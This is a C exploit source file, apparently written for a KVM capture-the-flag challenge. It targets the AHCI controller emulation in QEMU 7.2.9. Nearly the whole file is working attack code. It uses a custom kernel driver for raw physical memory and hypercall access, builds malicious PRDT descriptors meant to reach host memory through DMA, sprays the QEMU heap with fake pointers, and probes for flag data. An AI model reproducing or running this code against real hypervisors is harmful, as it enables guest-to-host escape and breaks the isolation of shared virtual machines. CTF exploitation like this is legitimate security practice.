/*
 * AHCI CVE-2021-3947 Exploit for QEMU 7.2.9
 * KVM CTF - Precise exploitation based on source analysis
 * 
 * Target: hw/ide/ahci.c ahci_populate_sglist()
 * 
 * Vulnerability: PRDT entries control DMA addresses used by sglist.
 * By crafting PRDT entries pointing to host memory, we can read/write
 * arbitrary host addresses via DMA operations.
 *
 * Structures (from QEMU 7.2.9):
 *   - AHCI_SG (PRDT entry): 16 bytes {addr[8], reserved[4], flags_size[4]}
 *   - QEMUSGList: 40 bytes {*sg, nsg, nalloc, size, *dev, *as}
 *   - NCQTransferState: ~112 bytes, contains sglist at offset 0x18
 *   - Command Table: 0x80 bytes FIS + PRDT entries
 *
 * Build: gcc -O2 -o ahci_exploit_v2 ahci_exploit_v2.c
 * Usage: ./ahci_exploit_v2 [--probe|--leak|--write|--spray N]
 */

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <errno.h>
#include <getopt.h>

/* Include our QEMU 7.2.9 structure definitions */
#include "ahci_internal.h"

/* ============================================================================
 * IOCTL Definitions (must match kvm_probe_drv)
 * ============================================================================ */

#define IOCTL_BASE               0x4000
#define IOCTL_READ_KERNEL_MEM    (IOCTL_BASE + 0x10)
#define IOCTL_READ_PHYSICAL_MEM  (IOCTL_BASE + 0x11)
#define IOCTL_WRITE_KERNEL_MEM   (IOCTL_BASE + 0x20)
#define IOCTL_WRITE_PHYSICAL_MEM (IOCTL_BASE + 0x21)
#define IOCTL_HYPERCALL          (IOCTL_BASE + 0x60)
#define IOCTL_HYPERCALL_BATCH    (IOCTL_BASE + 0x61)

#define DEVICE_PATH "/dev/kvm_probe_dev"

/* Common AHCI MMIO base addresses */
static uint64_t ahci_bases[] = {
    0xfebf0000,  /* Most common */
    0xfebd0000,
    0xfebf1000,
    0xfea00000,
};
#define AHCI_BASES_COUNT (sizeof(ahci_bases) / sizeof(ahci_bases[0]))

/* ============================================================================
 * Global State
 * ============================================================================ */

static int g_fd = -1;
static uint64_t g_ahci_base = 0;
static int g_verbose = 1;

/* ============================================================================
 * Driver Interface
 * ============================================================================ */

static int driver_open(void) {
    g_fd = open(DEVICE_PATH, O_RDWR);
    if (g_fd < 0) {
        perror("[-] Failed to open " DEVICE_PATH);
        printf("[!] Load driver: sudo insmod kvm_probe_drv.ko\n");
        return -1;
    }
    printf("[+] Opened %s (fd=%d)\n", DEVICE_PATH, g_fd);
    return 0;
}

static void driver_close(void) {
    if (g_fd >= 0) {
        close(g_fd);
        g_fd = -1;
    }
}

/* Read physical memory */
static int read_phys(uint64_t addr, void *buf, size_t size) {
    struct {
        uint64_t addr;
        uint64_t size;
        uint64_t buf_ptr;
    } req = {addr, size, (uint64_t)buf};
    
    if (ioctl(g_fd, IOCTL_READ_PHYSICAL_MEM, &req) < 0) {
        return -1;
    }
    return 0;
}

/* Write physical memory */
static int write_phys(uint64_t addr, const void *buf, size_t size) {
    struct {
        uint64_t addr;
        uint64_t size;
        uint64_t buf_ptr;
    } req = {addr, size, (uint64_t)buf};
    
    if (ioctl(g_fd, IOCTL_WRITE_PHYSICAL_MEM, &req) < 0) {
        return -1;
    }
    return 0;
}

/* Execute hypercall */
static uint64_t hypercall(uint64_t nr, uint64_t a0, uint64_t a1, uint64_t a2, uint64_t a3) {
    struct {
        uint64_t nr;
        uint64_t a0, a1, a2, a3;
        uint64_t result;
    } req = {nr, a0, a1, a2, a3, 0};
    
    if (ioctl(g_fd, IOCTL_HYPERCALL, &req) < 0) {
        return 0xffffffffffffffffULL;
    }
    return req.result;
}

/* Batch hypercalls 100-103 */
static void hypercall_batch(uint64_t results[4]) {
    struct {
        uint64_t r100, r101, r102, r103;
    } req = {0};
    
    if (ioctl(g_fd, IOCTL_HYPERCALL_BATCH, &req) == 0) {
        results[0] = req.r100;
        results[1] = req.r101;
        results[2] = req.r102;
        results[3] = req.r103;
    }
}

/* ============================================================================
 * AHCI MMIO Access
 * ============================================================================ */

static uint32_t ahci_read32(uint64_t offset) {
    uint32_t val = 0;
    read_phys(g_ahci_base + offset, &val, 4);
    return val;
}

static void ahci_write32(uint64_t offset, uint32_t val) {
    write_phys(g_ahci_base + offset, &val, 4);
}

/* Port register access (port 0-31, each port has 0x80 bytes) */
#define PORT_BASE(port)  AHCI_PORT_BASE(port)

static uint32_t port_read32(int port, uint32_t reg) {
    return ahci_read32(PORT_BASE(port) + reg);
}

static void port_write32(int port, uint32_t reg, uint32_t val) {
    ahci_write32(PORT_BASE(port) + reg, val);
}

/* ============================================================================
 * AHCI Detection
 * ============================================================================ */

static int detect_ahci(void) {
    printf("[*] Scanning for AHCI controller...\n");
    
    for (int i = 0; i < AHCI_BASES_COUNT; i++) {
        uint32_t cap, ghc, pi;
        
        if (read_phys(ahci_bases[i], &cap, 4) < 0) continue;
        if (read_phys(ahci_bases[i] + 4, &ghc, 4) < 0) continue;
        if (read_phys(ahci_bases[i] + 0xC, &pi, 4) < 0) continue;
        
        /* Check for valid AHCI signature */
        if (cap != 0 && cap != 0xFFFFFFFF && pi != 0) {
            int nports = (cap & 0x1F) + 1;
            printf("[+] Found AHCI @ 0x%lx\n", ahci_bases[i]);
            printf("    CAP=0x%08x GHC=0x%08x PI=0x%08x\n", cap, ghc, pi);
            printf("    Ports: %d\n", nports);
            g_ahci_base = ahci_bases[i];
            return 0;
        }
    }
    
    printf("[-] No AHCI controller found\n");
    return -1;
}

/* ============================================================================
 * DMA Buffer Management
 * ============================================================================ */

/* We need physically contiguous memory for DMA.
 * Use a higher physical address that's definitely in the direct map.
 * 16MB mark should be safe and above any legacy regions.
 */

#define DMA_BUFFER_PHYS  0x1000000ULL   /* 16MB - well within RAM */
#define DMA_BUFFER_SIZE  0x10000ULL     /* 64KB */

/* Initialize DMA region - don't fail if some writes don't work */
static int setup_dma_region(uint64_t phys_addr, size_t size) {
    /* Skip the bulk initialization - just let the individual writes work */
    /* The driver's direct write method works fine for smaller chunks */
    if (g_verbose) {
        printf("[*] DMA region @ 0x%llx (size=0x%llx) - will init on demand\n", 
               (unsigned long long)phys_addr, (unsigned long long)size);
    }
    return 0;  /* Always succeed - writes will work when needed */
}

/* ============================================================================
 * Command List and FIS Setup
 * ============================================================================ */

/* 
 * Memory layout for AHCI commands:
 * 
 * DMA_BUFFER_PHYS + 0x0000: Command List (32 entries * 32 bytes = 1024 bytes)
 * DMA_BUFFER_PHYS + 0x0400: Received FIS (256 bytes)
 * DMA_BUFFER_PHYS + 0x0800: Command Table 0 (0x80 header + PRDT)
 * DMA_BUFFER_PHYS + 0x1000: Command Table 1
 * ...
 * DMA_BUFFER_PHYS + 0x8000: Data buffer (for actual DMA transfers)
 */

#define CMD_LIST_PHYS    (DMA_BUFFER_PHYS + 0x0000)
#define CMD_LIST_SIZE    0x400
#define FIS_RECV_PHYS    (DMA_BUFFER_PHYS + 0x0400)
#define FIS_RECV_SIZE    0x100
#define CMD_TBL_BASE     (DMA_BUFFER_PHYS + 0x0800)
#define CMD_TBL_STRIDE   0x100   /* Each command table: 0x80 + room for PRDT */
#define DATA_BUF_PHYS    (DMA_BUFFER_PHYS + 0x8000)
#define DATA_BUF_SIZE    0x8000

/* Setup port for command execution */
static int setup_port(int port) {
    uint32_t cmd;
    
    /* Stop command engine first */
    cmd = port_read32(port, PORT_REG_CMD);
    if (cmd & (PORT_CMD_START | PORT_CMD_FIS_RX)) {
        port_write32(port, PORT_REG_CMD, cmd & ~(PORT_CMD_START | PORT_CMD_FIS_RX));
        usleep(10000);  /* Wait for engine to stop */
    }
    
    /* Set command list address */
    port_write32(port, PORT_REG_LST_ADDR, CMD_LIST_PHYS & 0xFFFFFFFF);
    port_write32(port, PORT_REG_LST_ADDR_HI, CMD_LIST_PHYS >> 32);
    
    /* Set FIS receive address */
    port_write32(port, PORT_REG_FIS_ADDR, FIS_RECV_PHYS & 0xFFFFFFFF);
    port_write32(port, PORT_REG_FIS_ADDR_HI, FIS_RECV_PHYS >> 32);
    
    /* Clear any pending interrupts/errors */
    port_write32(port, PORT_REG_IRQ_STAT, 0xFFFFFFFF);
    port_write32(port, PORT_REG_SCR_ERR, 0xFFFFFFFF);
    
    /* Start command engine */
    cmd = port_read32(port, PORT_REG_CMD);
    port_write32(port, PORT_REG_CMD, cmd | PORT_CMD_START | PORT_CMD_FIS_RX);
    
    usleep(10000);
    
    /* Verify engine started */
    cmd = port_read32(port, PORT_REG_CMD);
    if (!(cmd & PORT_CMD_LIST_ON)) {
        printf("[-] Port %d: Command list not running (CMD=0x%08x)\n", port, cmd);
        return -1;
    }
    
    if (g_verbose) {
        printf("[+] Port %d configured (CMD=0x%08x)\n", port, cmd);
    }
    return 0;
}

/* ============================================================================
 * Command Building - Use inline functions from ahci_internal.h
 * ============================================================================ */

/* Wrapper for header's build_cmd_hdr with our naming */
static void build_cmd_header(AHCICmdHdr *hdr, int slot, uint16_t opts, 
                             uint16_t prdtl, uint64_t tbl_addr) {
    (void)slot; /* slot is embedded in opts */
    build_cmd_hdr(hdr, opts, prdtl, tbl_addr);
}

/* Wrapper for header's build_prdt */
static void build_prdt_entry(AHCI_SG *sg, uint64_t addr, uint32_t size) {
    build_prdt(sg, addr, size);
}

/* ============================================================================
 * Exploit Functions
 * ============================================================================ */

/* 
 * Strategy 1: Use PRDT to read from arbitrary host address
 * 
 * The PRDT entries specify DMA addresses. During a DMA read operation
 * (device -> memory), QEMU reads from the device and writes to these addresses.
 * During DMA write (memory -> device), QEMU reads from these addresses.
 * 
 * By setting PRDT entries to point to host kernel addresses, we can potentially
 * leak data during a write command (host reads from kernel address).
 */

static int exploit_read_via_prdt(uint64_t target_addr, size_t size) {
    printf("\n[*] Attempting to read host memory via PRDT...\n");
    printf("    Target: 0x%lx, Size: 0x%lx\n", target_addr, size);
    
    int slot = 0;
    int port = 0;
    uint64_t cmd_tbl = CMD_TBL_BASE + slot * CMD_TBL_STRIDE;
    
    /* Build command table with malicious PRDT */
    uint8_t cmd_tbl_buf[256];
    memset(cmd_tbl_buf, 0, sizeof(cmd_tbl_buf));
    
    /* FIS: Write DMA Extended (causes device to read from PRDT addresses) */
    build_h2d_fis(cmd_tbl_buf, ATA_CMD_WRITE_DMA_EXT, 0, 1);
    
    /* PRDT at offset 0x80, pointing to target */
    AHCI_SG *prdt = (AHCI_SG *)(cmd_tbl_buf + 0x80);
    build_prdt_entry(&prdt[0], target_addr, size);
    
    /* Write command table to DMA region */
    write_phys(cmd_tbl, cmd_tbl_buf, sizeof(cmd_tbl_buf));
    
    /* Build and write command header */
    AHCICmdHdr hdr;
    build_cmd_header(&hdr, slot, 
                     AHCI_CMD_HDR_WRITE | (5 << 0),  /* 5 DWORDs in FIS */
                     1,                          /* 1 PRDT entry */
                     cmd_tbl);
    write_phys(CMD_LIST_PHYS + slot * sizeof(AHCICmdHdr), &hdr, sizeof(hdr));
    
    /* Issue command */
    printf("[*] Issuing command to slot %d...\n", slot);
    port_write32(port, PORT_REG_CMD_ISSUE, 1 << slot);
    
    /* Wait for completion */
    usleep(50000);
    
    uint32_t ci = port_read32(port, PORT_REG_CMD_ISSUE);
    uint32_t is = port_read32(port, PORT_REG_IRQ_STAT);
    printf("    CI=0x%08x IS=0x%08x\n", ci, is);
    
    /* Check if any data was transferred */
    /* The DMA engine may have read from the target address */
    
    /* Run hypercalls to check for side effects */
    uint64_t results[4];
    hypercall_batch(results);
    printf("    HC results:\n");
    for (int i = 0; i < 4; i++) {
        printf("      HC %d = 0x%016lx", 100 + i, results[i]);
        if (results[i] != 0 && results[i] != 0xffffffffffffffffULL) {
            printf(" <-- INTERESTING!");
        }
        printf("\n");
    }
    
    return 0;
}

/*
 * Strategy 2: NCQ command with malicious PRDT
 * 
 * NCQ (Native Command Queuing) allows multiple commands to be outstanding.
 * The sglist used by NCQ commands persists longer, potentially allowing
 * more time for exploitation.
 */

static int exploit_ncq_sglist(uint64_t target_addr, size_t size) {
    printf("\n[*] Attempting NCQ sglist exploit...\n");
    printf("    Target: 0x%lx, Size: 0x%lx\n", target_addr, size);
    
    int slot = 0;
    int port = 0;
    int tag = 0;
    uint64_t cmd_tbl = CMD_TBL_BASE + slot * CMD_TBL_STRIDE;
    
    /* Build command table with malicious PRDT */
    uint8_t cmd_tbl_buf[512];
    memset(cmd_tbl_buf, 0, sizeof(cmd_tbl_buf));
    
    /* NCQ Write FIS */
    build_ncq_fis(cmd_tbl_buf, ATA_CMD_WRITE_FPDMA_QUEUED, 0, 8, tag);
    
    /* Multiple PRDT entries pointing to different targets */
    AHCI_SG *prdt = (AHCI_SG *)(cmd_tbl_buf + 0x80);
    
    /* Entry 0: Write flag address */
    build_prdt_entry(&prdt[0], WRITE_FLAG_PHYS, 512);
    
    /* Entry 1: Read flag address */
    build_prdt_entry(&prdt[1], READ_FLAG_PHYS, 512);
    
    /* Entry 2: Target address if different */
    if (target_addr != WRITE_FLAG_PHYS && target_addr != READ_FLAG_PHYS) {
        build_prdt_entry(&prdt[2], target_addr, size < 512 ? size : 512);
    }
    
    /* Write command table */
    write_phys(cmd_tbl, cmd_tbl_buf, sizeof(cmd_tbl_buf));
    
    /* Build command header with PRDT count */
    AHCICmdHdr hdr;
    int prdtl = (target_addr != WRITE_FLAG_PHYS && target_addr != READ_FLAG_PHYS) ? 3 : 2;
    build_cmd_header(&hdr, slot,
                     AHCI_CMD_HDR_WRITE | (5 << 0),
                     prdtl,
                     cmd_tbl);
    write_phys(CMD_LIST_PHYS + slot * sizeof(AHCICmdHdr), &hdr, sizeof(hdr));
    
    /* For NCQ, set SACT register first */
    port_write32(port, PORT_REG_SCR_ACT, 1 << tag);
    
    /* Issue command */
    printf("[*] Issuing NCQ command (tag=%d, prdtl=%d)...\n", tag, prdtl);
    port_write32(port, PORT_REG_CMD_ISSUE, 1 << slot);
    
    /* Wait */
    usleep(100000);
    
    uint32_t sact = port_read32(port, PORT_REG_SCR_ACT);
    uint32_t ci = port_read32(port, PORT_REG_CMD_ISSUE);
    uint32_t is = port_read32(port, PORT_REG_IRQ_STAT);
    printf("    SACT=0x%08x CI=0x%08x IS=0x%08x\n", sact, ci, is);
    
    /* Check hypercalls */
    uint64_t results[4];
    hypercall_batch(results);
    printf("    HC results:\n");
    for (int i = 0; i < 4; i++) {
        printf("      HC %d = 0x%016lx", 100 + i, results[i]);
        if (results[i] != 0 && results[i] != 0xffffffffffffffffULL) {
            printf(" <-- INTERESTING!");
        }
        printf("\n");
    }
    
    return 0;
}

/*
 * Strategy 3: Heap spray + trigger vulnerability
 * 
 * Spray the QEMU heap with controlled data, then trigger the AHCI
 * vulnerability to corrupt heap metadata or function pointers.
 */

static int heap_spray(int count, size_t chunk_size) {
    printf("\n[*] Heap spray: %d chunks of 0x%lx bytes\n", count, chunk_size);
    
    /* Spray pattern that includes:
     * - Fake vtable/function pointers
     * - Flag addresses
     * - Marker pattern for detection
     */
    uint8_t *spray_data = malloc(chunk_size);
    if (!spray_data) {
        perror("malloc");
        return -1;
    }
    
    /* Fill with pattern */
    uint64_t *p = (uint64_t *)spray_data;
    for (size_t i = 0; i < chunk_size / 8; i++) {
        switch (i % 8) {
            case 0: p[i] = 0x4141414141414141ULL; break;  /* Marker */
            case 1: p[i] = WRITE_FLAG_PHYS; break;        /* Write flag */
            case 2: p[i] = READ_FLAG_PHYS; break;         /* Read flag */
            case 3: p[i] = 0x4242424242424242ULL; break;  /* Marker */
            case 4: p[i] = 0x100000ULL; break;            /* Low address */
            case 5: p[i] = 0x7f0000000000ULL; break;      /* Fake libc */
            case 6: p[i] = 0x550000000000ULL; break;      /* Fake heap */
            case 7: p[i] = chunk_size; break;             /* Size marker */
        }
    }
    
    /* Spray by sending commands with large PRDT tables */
    for (int i = 0; i < count; i++) {
        int slot = i % 32;
        uint64_t cmd_tbl = CMD_TBL_BASE + slot * CMD_TBL_STRIDE;
        
        /* Create command table with many PRDT entries */
        int num_entries = chunk_size / sizeof(AHCI_SG);
        if (num_entries > 16) num_entries = 16;  /* Limit per command */
        
        uint8_t cmd_buf[0x80 + 16 * sizeof(AHCI_SG)];
        memset(cmd_buf, 0, sizeof(cmd_buf));
        
        /* Simple read command */
        build_h2d_fis(cmd_buf, ATA_CMD_READ_DMA_EXT, i, 1);
        
        /* PRDT entries with spray pattern */
        AHCI_SG *prdt = (AHCI_SG *)(cmd_buf + 0x80);
        for (int j = 0; j < num_entries; j++) {
            prdt[j].addr = ((uint64_t *)spray_data)[j % (chunk_size / 8)];
            prdt[j].flags_size = 511;  /* 512 bytes per entry */
        }
        
        write_phys(cmd_tbl, cmd_buf, sizeof(cmd_buf));
        
        /* Command header */
        AHCICmdHdr hdr;
        build_cmd_header(&hdr, slot, 5 << 0, num_entries, cmd_tbl);
        write_phys(CMD_LIST_PHYS + slot * sizeof(AHCICmdHdr), &hdr, sizeof(hdr));
        
        /* Issue command */
        port_write32(0, PORT_REG_CMD_ISSUE, 1 << slot);
        
        if ((i + 1) % 10 == 0) {
            printf("    Sprayed %d/%d\n", i + 1, count);
            usleep(10000);
        }
    }
    
    /* Wait for commands to complete */
    usleep(100000);
    
    /* Check status */
    uint32_t ci = port_read32(0, PORT_REG_CMD_ISSUE);
    printf("[+] Spray complete, CI=0x%08x\n", ci);
    
    /* Run hypercalls and analyze results */
    uint64_t results[4];
    hypercall_batch(results);
    printf("    HC results:\n");
    printf("      HC 100 = 0x%016lx", results[0]);
    if (results[0] != 0 && results[0] != 0xffffffffffffffffULL) {
        printf(" <-- INTERESTING!");
        /* Check if it looks like a string */
        char *p = (char *)&results[0];
        int printable = 1;
        for (int i = 0; i < 8 && p[i]; i++) {
            if (p[i] < 32 || p[i] > 126) printable = 0;
        }
        if (printable && p[0]) printf(" \"%.8s\"", p);
    }
    printf("\n");
    
    printf("      HC 101 = 0x%016lx", results[1]);
    if (results[1] != 0 && results[1] != 0xffffffffffffffffULL) {
        printf(" <-- INTERESTING!");
    }
    printf("\n");
    
    printf("      HC 102 = 0x%016lx", results[2]);
    if (results[2] != 0 && results[2] != 0xffffffffffffffffULL) {
        printf(" <-- INTERESTING!");
        char *p = (char *)&results[2];
        int printable = 1;
        for (int i = 0; i < 8 && p[i]; i++) {
            if (p[i] < 32 || p[i] > 126) printable = 0;
        }
        if (printable && p[0]) printf(" \"%.8s\"", p);
    }
    printf("\n");
    
    printf("      HC 103 = 0x%016lx\n", results[3]);
    
    /* If we got interesting results, try more reads */
    if (results[0] != 0 && results[0] != 0xffffffffffffffffULL) {
        printf("\n[!] Got non-zero HC 100 result - probing more offsets...\n");
        for (int off = 0; off < 128; off += 8) {
            uint64_t r = hypercall(102, off, 0, 0, 0);
            if (r != 0 && r != 0xffffffffffffffffULL) {
                printf("      HC102(off=%d) = 0x%016lx", off, r);
                char *p = (char *)&r;
                int printable = 1;
                for (int i = 0; i < 8 && p[i]; i++) {
                    if (p[i] < 32 || p[i] > 126) printable = 0;
                }
                if (printable && p[0]) printf(" \"%.8s\"", p);
                printf("\n");
            }
        }
    }
    
    free(spray_data);
    return 0;
}

/*
 * Direct flag test via hypercalls
 */
static int test_flag_hypercalls(void) {
    printf("\n[*] Testing flag hypercalls directly...\n");
    
    uint64_t r;
    
    /* Test HC 100 with various arguments */
    printf("    HC 100 (flag read):\n");
    r = hypercall(100, 0, 0, 0, 0);
    printf("      (0,0,0,0) = 0x%lx", r);
    if (r != 0xffffffffffffffffULL) printf(" <-- VALID RESPONSE!");
    printf("\n");
    
    r = hypercall(100, WRITE_FLAG_PHYS, 0, 0, 0);
    printf("      (write_flag,0,0,0) = 0x%lx", r);
    if (r != 0xffffffffffffffffULL) printf(" <-- VALID RESPONSE!");
    printf("\n");
    
    r = hypercall(100, READ_FLAG_PHYS, 0, 0, 0);
    printf("      (read_flag,0,0,0) = 0x%lx", r);
    if (r != 0xffffffffffffffffULL) printf(" <-- VALID RESPONSE!");
    printf("\n");
    
    /* Test HC 101 (relative write) */
    printf("    HC 101 (relative write):\n");
    r = hypercall(101, 0, 0x41414141, 0, 0);
    printf("      (0, 0x41414141, 0, 0) = 0x%lx", r);
    if (r != 0xffffffffffffffffULL) printf(" <-- VALID RESPONSE!");
    printf("\n");
    
    /* Test HC 102 (relative read) */
    printf("    HC 102 (relative read):\n");
    for (int offset = 0; offset < 64; offset += 8) {
        r = hypercall(102, offset, 0, 0, 0);
        printf("      (offset=%d) = 0x%lx", offset, r);
        if (r != 0xffffffffffffffffULL && r != 0) {
            printf(" <-- DATA!");
            /* Try to print as string if printable */
            char *p = (char *)&r;
            int printable = 1;
            for (int i = 0; i < 8 && p[i]; i++) {
                if (p[i] < 32 || p[i] > 126) printable = 0;
            }
            if (printable && p[0]) {
                printf(" \"%.8s\"", p);
            }
        }
        printf("\n");
    }
    
    /* Test HC 103 (DoS - be careful) */
    printf("    HC 103 (DoS - skipping for safety)\n");
    
    return 0;
}

/*
 * Read flag address via physical memory
 * Note: These are guest physical addresses - they should work with direct access
 */
static int read_flag_memory(void) {
    printf("\n[*] Reading flag addresses via physical memory...\n");
    printf("    Note: These are GUEST physical addresses\n");
    printf("    The hypervisor maps these to HOST addresses for flag operations\n\n");
    
    uint8_t buf[64];
    int success = 0;
    
    /* Read write_flag area */
    printf("    write_flag @ phys 0x%llx:\n", (unsigned long long)WRITE_FLAG_PHYS);
    memset(buf, 0xAA, sizeof(buf));  /* Fill with pattern to detect reads */
    if (read_phys(WRITE_FLAG_PHYS, buf, 64) == 0) {
        /* Check if we got actual data (not just 0xAA pattern) */
        int got_data = 0;
        for (int i = 0; i < 64; i++) {
            if (buf[i] != 0xAA) { got_data = 1; break; }
        }
        if (got_data) {
            success = 1;
            for (int i = 0; i < 64; i += 16) {
                printf("      %08llx: ", (unsigned long long)(WRITE_FLAG_PHYS + i));
                for (int j = 0; j < 16; j++) {
                    printf("%02x ", buf[i+j]);
                }
                printf(" |");
                for (int j = 0; j < 16; j++) {
                    printf("%c", (buf[i+j] >= 32 && buf[i+j] < 127) ? buf[i+j] : '.');
                }
                printf("|\n");
            }
        } else {
            printf("      (no data - pattern unchanged)\n");
        }
    } else {
        printf("      (read failed - this address may be host-only)\n");
    }
    
    /* Read read_flag area */
    printf("    read_flag @ phys 0x%llx:\n", (unsigned long long)READ_FLAG_PHYS);
    memset(buf, 0xBB, sizeof(buf));
    if (read_phys(READ_FLAG_PHYS, buf, 64) == 0) {
        int got_data = 0;
        for (int i = 0; i < 64; i++) {
            if (buf[i] != 0xBB) { got_data = 1; break; }
        }
        if (got_data) {
            success = 1;
            for (int i = 0; i < 64; i += 16) {
                printf("      %08llx: ", (unsigned long long)(READ_FLAG_PHYS + i));
                for (int j = 0; j < 16; j++) {
                    printf("%02x ", buf[i+j]);
                }
                printf(" |");
                for (int j = 0; j < 16; j++) {
                    printf("%c", (buf[i+j] >= 32 && buf[i+j] < 127) ? buf[i+j] : '.');
                }
                printf("|\n");
            }
        } else {
            printf("      (no data - pattern unchanged)\n");
        }
    } else {
        printf("      (read failed - this address may be host-only)\n");
    }
    
    if (!success) {
        printf("\n    [!] Flag addresses are likely HOST physical, not guest-accessible\n");
        printf("    [!] Must use hypercalls or AHCI DMA to access them\n");
    }
    
    return 0;
}

/* ============================================================================
 * Main
 * ============================================================================ */

static void usage(const char *prog) {
    printf("Usage: %s [OPTIONS]\n", prog);
    printf("\nOptions:\n");
    printf("  --probe          Probe for AHCI controller\n");
    printf("  --hypercalls     Test hypercalls directly\n");
    printf("  --flag           Read flag memory addresses\n");
    printf("  --prdt ADDR      Exploit via PRDT pointing to ADDR\n");
    printf("  --ncq            NCQ sglist exploit\n");
    printf("  --spray N        Heap spray N chunks\n");
    printf("  --full           Run full exploit chain\n");
    printf("  --quiet          Reduce output\n");
    printf("  -h, --help       Show this help\n");
}

int main(int argc, char *argv[]) {
    int opt;
    int do_probe = 0, do_hc = 0, do_flag = 0;
    int do_prdt = 0, do_ncq = 0, do_full = 0;
    int spray_count = 0;
    uint64_t prdt_target = READ_FLAG_PHYS;
    
    static struct option long_options[] = {
        {"probe",     no_argument,       0, 'p'},
        {"hypercalls", no_argument,      0, 'c'},
        {"flag",      no_argument,       0, 'f'},
        {"prdt",      required_argument, 0, 'r'},
        {"ncq",       no_argument,       0, 'n'},
        {"spray",     required_argument, 0, 's'},
        {"full",      no_argument,       0, 'F'},
        {"quiet",     no_argument,       0, 'q'},
        {"help",      no_argument,       0, 'h'},
        {0, 0, 0, 0}
    };
    
    while ((opt = getopt_long(argc, argv, "pcfr:ns:Fqh", long_options, NULL)) != -1) {
        switch (opt) {
            case 'p': do_probe = 1; break;
            case 'c': do_hc = 1; break;
            case 'f': do_flag = 1; break;
            case 'r': 
                do_prdt = 1;
                prdt_target = strtoull(optarg, NULL, 0);
                break;
            case 'n': do_ncq = 1; break;
            case 's': spray_count = atoi(optarg); break;
            case 'F': do_full = 1; break;
            case 'q': g_verbose = 0; break;
            case 'h':
            default:
                usage(argv[0]);
                return (opt == 'h') ? 0 : 1;
        }
    }
    
    /* Default action */
    if (!do_probe && !do_hc && !do_flag && !do_prdt && !do_ncq && 
        !spray_count && !do_full) {
        do_full = 1;
    }
    
    printf("=== AHCI Exploit for QEMU 7.2.9 ===\n\n");
    
    /* Open driver */
    if (driver_open() < 0) {
        return 1;
    }
    
    /* Detect AHCI */
    if (detect_ahci() < 0) {
        printf("[!] Continuing without AHCI (hypercalls may still work)\n");
    }
    
    /* Setup DMA region if we have AHCI */
    if (g_ahci_base) {
        if (setup_dma_region(DMA_BUFFER_PHYS, DMA_BUFFER_SIZE) < 0) {
            printf("[-] Failed to setup DMA region\n");
        } else {
            setup_port(0);
        }
    }
    
    /* Execute requested operations */
    if (do_full) {
        test_flag_hypercalls();
        read_flag_memory();
        
        if (g_ahci_base) {
            heap_spray(50, 0x290);
            exploit_ncq_sglist(READ_FLAG_PHYS, 512);
            exploit_read_via_prdt(WRITE_FLAG_PHYS, 512);
        }
        
        printf("\n[*] Check dmesg for [CTF] results: dmesg | grep CTF\n");
    } else {
        if (do_probe) {
            /* Already done */
            printf("[*] Probe complete\n");
        }
        if (do_hc) {
            test_flag_hypercalls();
        }
        if (do_flag) {
            read_flag_memory();
        }
        if (spray_count > 0) {
            heap_spray(spray_count, 0x290);
        }
        if (do_ncq && g_ahci_base) {
            exploit_ncq_sglist(prdt_target, 512);
        }
        if (do_prdt && g_ahci_base) {
            exploit_read_via_prdt(prdt_target, 512);
        }
    }
    
    driver_close();
    return 0;
} 